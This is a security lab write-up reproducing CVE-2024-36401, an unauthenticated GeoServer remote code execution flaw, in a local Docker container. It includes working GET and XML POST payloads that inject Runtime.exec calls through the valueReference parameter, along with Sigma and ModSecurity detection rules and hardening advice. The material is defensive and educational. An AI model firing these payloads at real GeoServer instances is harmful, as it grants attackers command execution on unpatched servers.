# CVE-2024-36401 — GeoServer Unauthenticated RCE via XPath/OGC Property Name Evaluation

## 1. Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2024-36401 |
| Product | GeoServer < 2.25.1 / < 2.24.3 / < 2.23.5 |
| Attack Vector | Network (Pre-Auth, single GET request) |
| Impact | Remote Code Execution |
| CVSS 3.1 | 9.8 Critical |
| Patch | 2.25.1 / 2.24.4 / 2.23.6 |

GeoServer unsafely evaluates OGC filter property names as XPath expressions. Multiple request types (`GetPropertyValue`, `GetFeature`, `GetMap`, etc.) pass user-controlled `valueReference` / `PropertyName` parameters directly into the XPath/EL evaluation engine, allowing unauthenticated attackers to call arbitrary Java methods — including `Runtime.exec()`.

## 2. Attack Chain

```
Recon: Browse /geoserver/web/ → identify available typeNames (layer list is public)
  └─▶ Craft: valueReference=exec(java.lang.Runtime.getRuntime(),'<cmd>')
      └─▶ Deliver: Single GET to /geoserver/wfs?request=GetPropertyValue&...
          └─▶ Impact: Command execution as GeoServer process user (root in Docker)
```

## 3. Reproduction

### Environment

```bash
cd ~/Security/tools/vulhub/geoserver/CVE-2024-36401
docker compose up -d
# GeoServer 2.23.2 on port 8080, wait ~20s for startup
```

### Step 1 — Identify Available Layers (typeNames)

```bash
# The layer list is public — no auth needed
curl -s "http://localhost:8080/geoserver/wfs?service=WFS&request=GetCapabilities" | \
  grep -oP 'Name>\K[^<]+' | head -5
# sf:archsites, sf:bugsites, sf:restricted, sf:roads, sf:streams
```

A valid `typeNames` value is required for the exploit to work.

### Step 2 — XPath Expression Injection (GET)

```bash
curl -s "http://localhost:8080/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/geoserver_rce_success')"
# Returns 400 with ClassCastException: java.lang.ProcessImpl → command executed
```

The `ClassCastException` for `ProcessImpl` is the success indicator — `exec()` returned a `Process` object that GeoServer tried to use as an attribute descriptor.

### Step 3 — Verify RCE

```bash
docker exec cve-2024-36401-web-1 ls -la /tmp/geoserver_rce_success
# -rw-r--r-- 1 root root 0 ... /tmp/geoserver_rce_success
```

### Alternative: POST Method (WFS XML)

```xml
<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:sf='http://cite.opengeospatial.org/gmlsf'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'id')</wfs:valueReference>
</wfs:GetPropertyValue>
```

### Cleanup

```bash
docker compose down -v
```

## 4. Lessons Learned

- **Property name evaluation is a hidden attack surface**: OGC/WFS specs define property names as simple strings, but GeoServer evaluated them as XPath/EL expressions — a classic "data treated as code" flaw.
- **Single GET request RCE**: No POST body, no auth, no session — the simplest possible exploit vector. Trivial to weaponize at scale.
- **Multiple entry points**: `GetPropertyValue`, `GetFeature`, `GetMap`, `GetFeatureInfo`, `GetLegendGraphic`, `WPS Execute` — all vulnerable through the same underlying evaluation engine.
- **Error-based confirmation**: The `ClassCastException: ProcessImpl` in the response confirms execution without needing out-of-band verification.

## 5. Defense

### 5.1 Hardening

| Layer | Action |
|-------|--------|
| Application | Upgrade to GeoServer ≥ 2.23.6 / 2.24.4 / 2.25.1 |
| Configuration | Disable unused OGC services (WPS, WCS) in GeoServer admin |
| Network | Never expose GeoServer directly to internet; place behind reverse proxy with auth |
| WAF | Block requests containing `exec(`, `Runtime`, `getRuntime` in query parameters |
| Container | Run as non-root, read-only rootfs, restrict outbound network |
| Access Control | Enable GeoServer's built-in security and restrict anonymous access to layers |

### 5.2 Detection (SIEM / WAF Rules)

```yaml
# Sigma rule — GeoServer XPath RCE
title: GeoServer CVE-2024-36401 XPath Expression Injection
logsource:
  category: webserver
  product: any
detection:
  selection:
    cs-uri-stem|contains: '/geoserver/'
  keywords_url:
    cs-uri-query|contains:
      - 'exec(java.lang'
      - 'Runtime.getRuntime'
      - 'getRuntime()'
      - 'ProcessBuilder'
  keywords_body:
    cs-body|contains:
      - 'exec(java.lang'
      - 'Runtime.getRuntime'
      - 'valueReference>exec'
  condition: selection and (keywords_url or keywords_body)
  level: critical
```

```
# ModSecurity rule
SecRule REQUEST_URI "@contains /geoserver/" \
  "id:2024364011,phase:1,deny,status:403,\
   chain,msg:'CVE-2024-36401 GeoServer XPath RCE'"
  SecRule ARGS "@rx (?i)exec\s*\(\s*java\.lang" ""

SecRule REQUEST_URI "@contains /geoserver/" \
  "id:2024364012,phase:2,deny,status:403,\
   chain,msg:'CVE-2024-36401 GeoServer XPath RCE (POST)'"
  SecRule REQUEST_BODY "@rx (?i)exec\s*\(\s*java\.lang" ""
```

### 5.3 Threat Hunting

| Hypothesis | Data Source | Query Logic |
|------------|-------------|-------------|
| XPath injection in OGC requests | WAF / access logs | `valueReference` or `PropertyName` containing `exec(`, `Runtime`, `ProcessBuilder` |
| Reconnaissance of layer names | Access logs | Repeated `GetCapabilities` requests from single IP (attacker enumerating typeNames) |
| Post-exploitation activity | EDR / process tree | Child processes spawned by Java/GeoServer process (sh, bash, curl, wget) |
| Reverse shell from GeoServer | Network flows | Outbound TCP from GeoServer container to non-standard ports |
| File system changes | AIDE / osquery | New files created by GeoServer process user in /tmp or web-writable dirs |

## 6. Tools & References

| Tool | Purpose |
|------|---------|
| curl | Single GET request exploit |
| docker / vulhub | Local vulnerable environment |

- [GitHub Advisory — GHSA-6jj6-gm7p-fcvv](https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv)
- [NVD — CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)
- [GeoTools Advisory — GHSA-w3pj-wh35-fq8w](https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w)
- [OGC WFS Specification](https://www.ogc.org/standard/wfs/)

## 7. Disclaimer

This reproduction was performed in an isolated Docker environment (vulhub) on localhost for educational purposes only. No production systems were targeted. The goal is to understand the vulnerability mechanism and develop effective detection/hardening strategies.
